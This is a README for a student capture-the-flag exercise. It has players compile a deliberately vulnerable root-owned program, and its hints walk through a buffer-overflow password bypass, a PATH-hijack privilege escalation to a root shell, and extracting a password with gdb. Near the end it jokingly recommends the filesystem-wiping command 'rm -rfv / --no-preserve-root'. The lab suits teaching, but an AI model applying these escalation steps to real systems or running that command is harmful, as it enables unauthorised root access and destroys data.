# Capture the hack
### What is this "game"?
+ This exploit game aims to learn some very basic linux comands and also some low *hacking* knowlage to collect all flags.
+ And also this is project for BPC-IC1.
## How to play
### Initial setup:
+ Clone this repo and cd in its file:
```bash
git clone https://github.com/PrimalMight/IC1_Project.git
smthn=`find $(pwd) -name 'IC1_Project'` && cd $smthn
```
+ Compile totally legit SW:
```bash
sudo gcc -w -g -fno-stack-protector -o launch_me main.c   
sudo gcc -o decryptor decryptor.c 
```
> names ``launch_me`` and ``decryptor`` are optional, but i recommend not changing it. <br>
### Game tutorial:
Start the program with ``./launch_me``.
+ **First flag: Buffer overflow bypass the initial password check!**
	* After the program is started, player is asked for some password, well we dont know the password, se you need to find other way how to gain acces! <br>
	<details>
 	<summary>Hint here!</summary>

  ```
  Maybe try spam of ``A`` (somewhere between 1 and 35) ``1`` on the end?
  ```
	</details>
+ **Second flag: Hijack the path for relative curl call in the program for shell and escalate privilege to root!**
	* ``$ strings exploit_this`` to get information about the compiled file. <br>
	* ``$ curl -I localhost`` - curl is called without full path using $PATH variable! <br>
	* So you need to hijack the curl path and substitute curl for shell. <br>
	<details>
 	<summary>Hint here!</summary>

  ```bash
  strings launch_me
  echo /usr/bin > /tmp/curl
  #this one is easy, give all privileges to curl (use chmod)
  export PATH=/tmp:$PATH
  #cd back to the repo file
  which curl
  #launch the compiled program with ./launch_me
  #enter the password overflow that worked from first flag
  #choose ``y`` on "do you want to check fo running http localhost service (y/n)"
  #execute ``whoami`` command to make sure, you have root privileges
  ```
	</details>
	
+ **Third flag: Extract the password from memory using gdb tool and use this password to decrypt ``riddle_me_this_batman.txt`` file containing final riddle for batman!**
	* There are two parts player needs to do.
	* First, create another .txt file and with echo add some text into it (it is needed to do this, because it is the unix way of adding text to the file).
	```bash
	touch test.txt; echo "We are no strangers to love, You know the rules and so do I!"
	```
	* launch compiled programme with gdb and try to extract password from memmory.
	```bash
	gdb launch_me
	break <name_of_the_function_player_need_to_break>
	```
	<details>
 	<summary>Hint here!</summary>

  ```bash
  (in normal console) gdb lanch_me
  (in gdb) break encrypt_file
  (in gdb) #answer ``y`` to "Enable debuginfo for this session(y or [n])"
  (in gdb) run
  (in gdb) #enter the "password" from first flag
  (in gdb) #answer ``n`` to "want to check for local service running?"
  (in gdb) #answer ``y`` to "do you want to encrypt file? (y/n)"
  (in gdb) #enter the filename: test.txt (or whatever you choosed to name it)
  (in gdb) x/s password #still in the gdb
  (in gdb) exit
  (in gdb) #answer ``y`` to "Quit anyway?(y or n)"
  ```
	</details>
	
	* Second part is decrypthing the ``riddle_me_this_batman.txt``.
	* To do that, you need once again enter shell with root privileges (second flag) and use password you found above for encryptor to decrypt .txt file.
	```bash
	./decryptor
	> please provide a password: <here_goes_the_password>
	nano output_plaintext.txt
	```
	* And now you've got all the flags, so there is one final thing you need to do before you leave this VM image, what is the answer for the riddle?.
	* [Click me for answer](https://youtu.be/54P0GQEM4w8)
	<details>
 	<summary>Hint here!</summary>

  ```bash
  (normal console) ./launch_me
  > Do you want to check for runninf http localhost service? (y/n)
   y
  (root from flag2) ./decryptor
  > Please prowide a password: <here_goes_the_password>
  (root from flag2) nano output_plaintext.txt
  ```
	</details>
	
	* And now you can leave with style! 
	> I recommend using something like ``rm -rfv / --no-preserve-root``
	
## BPC-IC1 things:
Authors: 2x BPC-IBE, 1x BPC-TLI
### Vulnerabilities
- [x] Buffer overflow into password check bypass
- [x] Relative path hijack into privilege escalation with SUID bit
- [x] Visible password in memory

